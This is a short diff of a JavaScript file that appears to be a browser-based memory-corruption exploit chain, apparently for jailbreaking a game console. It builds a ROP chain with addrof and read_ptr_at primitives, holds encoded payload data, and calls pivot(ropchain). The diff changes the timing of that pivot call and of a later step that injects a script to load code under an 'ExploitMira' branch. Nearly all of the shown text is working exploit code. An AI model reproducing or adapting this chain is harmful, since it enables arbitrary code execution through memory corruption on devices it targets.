@@ -1,5 +1,3 @@
-
-
 var ropchain_array = new Uint32Array(153644);
 var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
 var ropchain_offset = 2;
@@ -40316,7 +40314,10 @@ db([809334898,1819026808,2003968120,628633661,175664236,0]);
 db([1701273968,1534620255,1025531184,628633632,2680,0]);
 db([1936682083,1713398885,1680154724,10]);
 db([1000,0,0,0,0,0]);
+
+setTimeout(function(){
 pivot(ropchain);
+},500);
 var main_ret = read_ptr_at(main_ret);
 var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
 var printf_ans = read_mem_as_string(printf_buf,printf_buf_end-printf_buf);
@@ -40339,7 +40340,7 @@ if (ExploitMira != null){
     setTimeout(function(){
     let loadbin = document.createElement('script');loadbin.src = "./common/"+binL+"_loadcode.js";
     document.getElementsByTagName('head')[0].appendChild(loadbin);}
-    ,1000);
+    ,500);
     },1000);
   }} 
 else {
